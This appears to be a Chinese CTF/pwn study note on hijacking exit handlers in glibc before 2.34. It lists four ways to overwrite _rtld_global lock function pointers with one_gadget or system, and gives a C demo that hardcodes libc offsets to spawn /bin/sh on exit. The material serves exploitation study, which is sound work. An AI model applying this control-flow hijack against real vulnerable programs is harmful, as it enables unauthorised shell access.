# exit_hook劫持

`glibc-2.34`之前

## 四种方式

修改`_rtld_global._dl_rtld_lock_recursive`为`one_gadget`
修改`_rtld_global._dl_rtld_unlock_recursive`为`one_gadget`
修改`_rtld_global._dl_rtld_lock_recursive`为`system`和`_rtld_global._dl_load_lock`为`/bin/sh`
修改`_rtld_global._dl_rtld_unlock_recursive`为`system`和`_rtld_global._dl_load_lock`为`/bin/sh`

## 示例

```C
// 修改`_rtld_global._dl_rtld_lock_recursive`为`system`和`_rtld_global._dl_load_lock`为`/bin/sh`
#include <stdio.h>
#include <stdlib.h>

char *binsh = "/bin/sh";

int main(void)
{
    /* 寻找地址 */

    // p/x &system-$libc
    char *libc_base = ((char *)(&system) - 0x52290);

    // p/x (void*)&_rtld_global._dl_rtld_lock_recursive-$libc
    // p/x (void*)&_rtld_global._dl_rtld_unlock_recursive-$libc
    size_t *rtld_lock_default_lock_recursive = (size_t *)(libc_base + 0x228f68);

    // p (void*)&_rtld_global._dl_load_lock-$libc
    size_t *dl_load_lock = (size_t *)(libc_base + 0x228968);

    /* 修改地址 */
        
    // 设置 rtld_lock_default_lock_recursive 为 system
    *rtld_lock_default_lock_recursive = (size_t)&system;

    // 设置 _dl_load_lock 为 /bin/sh
    *dl_load_lock = *(size_t*)binsh;

    exit(1);
    return 0;
}
```
